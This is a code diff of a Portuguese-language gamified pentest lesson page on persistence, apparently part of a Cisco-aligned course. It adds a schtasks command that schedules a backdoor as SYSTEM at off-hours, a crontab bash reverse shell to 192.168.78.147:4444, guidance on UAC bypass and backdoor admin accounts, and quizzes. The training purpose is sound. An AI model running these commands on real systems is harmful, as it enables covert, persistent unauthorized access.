@@ -9,7 +9,7 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Executando Técnicas de Pós-Exploração</title>
+    <title>CyberDuo - Persistência Avançada: Agendamentos, Serviços e Contas</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -131,39 +131,73 @@
         const steps = [
             {
                         "type": "teach",
-                        "icon": "fa-flag",
-                        "title": "Objetivos da Pós-Exploração (Cisco 8.0.1)",
-                        "content": "Em um teste de penetração, o objetivo final vai muito além de apenas encontrar vulnerabilidades. Após comprometer uma máquina alvo, a fase de <b>Pós-Exploração</b> serve para avaliar o risco de perdas potenciais que o cliente sofreria se um atacante real invadisse o sistema.<br><br>🛡️ Esta fase demonstra na prática até onde o invasor pode penetrar na rede interna e a quais dados confidenciais ele teria acesso total.",
-                        "highlight": "Na pós-exploração, você prova o impacto financeiro e operacional de uma invasão real!"
+                        "icon": "fa-clock",
+                        "title": "Agendador de Tarefas do Windows (Cisco 8.1.6)",
+                        "content": "No Windows, o Agendador de Tarefas (`taskschd.msc`) é uma mina de ouro para a persistência. Um invasor pode agendar tarefas para rodar no boot ou periodicamente.<br><br>⚙️ Se o atacante tiver acesso à GUI, ele pode usar tarefas agendadas para <b>burlar o UAC (Controle de Conta de Usuário)</b>, pois tarefas podem ser configuradas para rodar com os privilégios máximos do sistema (SYSTEM) sem solicitar credenciais administrativas.",
+                        "highlight": "Tarefas agendadas rodam de forma invisível e persistente em privilégio SYSTEM."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-terminal",
+                        "title": "Prática - Criando Tarefa Agendada no Windows",
+                        "scenario": "Para evitar alarmes, o pentester agenda a execução de um backdoor compactado para rodar nos fins de semana à noite (quando não há monitoramento ativo e a rede está ociosa):",
+                        "code": "> schtasks /create /tn \"SystemMaintenance\" /tr \"c:\\temp\\backdoor.exe\" /sc weekly /d SAT /st 23:00 /ru \"SYSTEM\"",
+                        "takeaway": "O utilitário schtasks configura persistência nativa e com privilégio máximo de forma imperceptível."
             },
             {
                         "type": "teach",
-                        "icon": "fa-clock",
-                        "title": "Medindo o Tempo de Detecção (Cisco 8.0.1)",
-                        "content": "Outro objetivo crucial da pós-exploração é <b>avaliar a eficácia dos defensores</b> da organização (a equipe azul ou o SOC).<br><br>⏱️ Durante os testes, avalia-se quanto tempo a equipe de segurança leva para detectar as atividades suspeitas, identificar arquivos maliciosos e responder ao exploit. Isso ajuda a calibrar os sensores e alertas de intrusão do cliente.",
-                        "highlight": "Entrar sem ser detectado avalia a furtividade e a competência de monitoramento do SOC!"
+                        "icon": "fa-repeat",
+                        "title": "Daemons Customizados e Cron Jobs no Linux (Cisco 8.1.7)",
+                        "content": "No Linux, a forma mais garantida de sobrevivência a reinicializações é criar <b>daemons/serviços customizados</b> iniciados na inicialização do boot ou configurar agendamentos na <b>Crontab (Cron Jobs)</b>.<br><br>Esses scripts garantem a execução regular do payload e restabelecem a conexão se ela cair.",
+                        "highlight": "Daemons e crontabs executam comandos silenciosos de volta para a máquina do atacante."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-code",
+                        "title": "Prática - Cron Job de Persistência no Linux",
+                        "scenario": "O invasor insere uma linha no crontab do Linux para executar uma tentativa de shell reverso secreta a cada 5 minutos:",
+                        "code": "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.78.147/4444 0>&1'",
+                        "takeaway": "A cada 5 minutos, a vítima tentará silenciosamente nos dar acesso root de volta."
             },
             {
                         "type": "quiz",
-                        "task": "De acordo com as boas práticas da Cisco, qual é um objetivo essencial ao executar atividades de pós-exploração em um pentest?",
+                        "task": "Por que a criação de tarefas agendadas administrativas (via 'schtasks') com privilégios de SYSTEM permite contornar proteções interativas de controle de conta (UAC)?",
                         "options": [
-                                    "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
-                                    "Causar danos físicos irreparáveis para forçar a empresa a comprar novos hardwares.",
-                                    "Instalar softwares de mineração de bitcoin ocultos para financiar o projeto."
+                                    "Porque as tarefas agendadas administrativas rodam em privilégio de sistema máximo do kernel sem exigir validação ou interação humana.",
+                                    "Porque o UAC só funciona em navegadores de internet e não monitora o prompt de comando.",
+                                    "Porque as tarefas agendadas administrativas removem fisicamente o antivírus da máquina da vítima."
                         ],
-                        "correctText": "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
-                        "explanation": "Testar a capacidade de resposta e detecção do SOC ajuda a calibrar sistemas de alarmes e otimizar processos de incidentes da empresa."
+                        "correctText": "Porque as tarefas agendadas administrativas rodam em privilégio de sistema máximo do kernel sem exigir validação ou interação humana.",
+                        "explanation": "O agendador de tarefas executa processos administrativos no background de forma nativa e não interativa, o que burla as caixas de alerta do UAC."
             },
             {
                         "type": "fill",
-                        "sentence": "Após a invasão inicial, o testador executa atividades de pós-exploração para mover-se lateralmente e manter a ___ permanente no sistema comprometido.",
+                        "sentence": "Para configurar persistência nativa a cada poucos minutos no Linux, editamos os agendamentos salvos no utilitário de tabela do sistema operacional chamado ___.",
                         "options": [
-                                    "persistência",
-                                    "criptografia",
-                                    "desconexão"
+                                    "crontab",
+                                    "systemctl",
+                                    "passwd"
                         ],
-                        "correctText": "persistência",
-                        "explanation": "A persistência garante que o acesso seja mantido mesmo após reboots do servidor, permitindo demonstrar o impacto de longo prazo."
+                        "correctText": "crontab",
+                        "explanation": "A tabela do daemon Cron (crontab) executa tarefas agendadas de background de forma regular."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-user-plus",
+                        "title": "Novo Usuário Administrador (Cisco 8.1.8)",
+                        "content": "Se o testador de penetração obteve privilégios de <b>Administrador (Windows) ou Root (Linux)</b>, ele pode consolidar seu acesso criando contas alternativas e adicionais de usuários na máquina.<br><br>🔐 <b>Boas Práticas de Ataque</b>: Crie contas alternativas usando <b>senhas complexas e robustas</b> para evitar que atacantes rivais façam brute force em sua porta dos fundos ou que os administradores descubram acessos fracos.",
+                        "highlight": "Novas contas de usuário fornecem persistência legítima via protocolos de RDP ou SSH."
+            },
+            {
+                        "type": "quiz",
+                        "task": "Ao criar contas alternativas de administrador para manter a persistência após comprometer um sistema, qual recomendação deve ser seguida?",
+                        "options": [
+                                    "Utilizar senhas altamente complexas para evitar o sequestro do acesso por outros agentes de ameaça.",
+                                    "Utilizar senhas vazias ou 'admin123' para facilitar acessos rápidos de qualquer local.",
+                                    "Não configurar senhas, já que o sistema automaticamente desativa a autenticação para testadores."
+                        ],
+                        "correctText": "Utilizar senhas altamente complexas para evitar o sequestro do acesso por outros agentes de ameaça.",
+                        "explanation": "Senhas fracas deixadas por pentesters representam um risco gigantesco de intrusão real por cibercriminosos (que varrem a rede constantemente)."
             }
 ];
 
@@ -445,7 +479,7 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.1a-shells-c2.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.2a-movimento-lateral.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
                 nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             }
@@ -453,7 +487,7 @@
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">Você compreendeu a base pedagógica e os objetivos reais de pós-exploração no pentest!</h2>
+                    <h2 class="title-main mb-2">Você compreendeu a fundo os mecanismos de persistência no Windows e Linux, garantindo o acesso simulado a longo prazo!</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
